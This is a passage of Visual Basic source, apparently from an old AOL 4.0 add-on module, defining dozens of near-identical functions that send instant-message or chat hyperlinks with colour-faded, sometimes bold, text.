        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreyBlackGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreyBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreyBlueGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreyGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreyGreenGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreyPurple(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreyPurpleGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreyRed(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreyRedGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreyYellow(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreyYellowGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreenBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreenBlackGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreenBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreenBlueGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreenPurple(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreenPurpleGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreenRed(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreenRedGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreenYellow(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreenYellowGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<b><Font Color=#" & h & "></b>" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreyBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreyBlackGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreyBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreyBlueGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreyGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreyGreenGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreyPurple(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreyPurpleGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreyRed(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreyRedGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreyYellow(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldGreyYellowGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldBlackBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBlackBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBlackBlueBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBlackGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBlackGreenBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBlackGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBlackGreyBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBlackPurple(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBlackPurpleBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBlackRed(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBlackedRedBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBlackRedBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBlackYellow(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBlackYellowBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBlueBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBlueBlackBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBlueGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBlueGreenBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBluePurple(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBluePurpleBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBlueRed(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBlueRedBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBlueYellow(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBlueYellowBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldBlackBlueBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldBlackGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldBlackGreenBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldBlackGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldBlackGreyBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldBlackPurple(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldBlackPurpleBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldBlackRed(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldBlackedRedBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldBlackRedBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldBlackYellow(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldBlackYellowBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
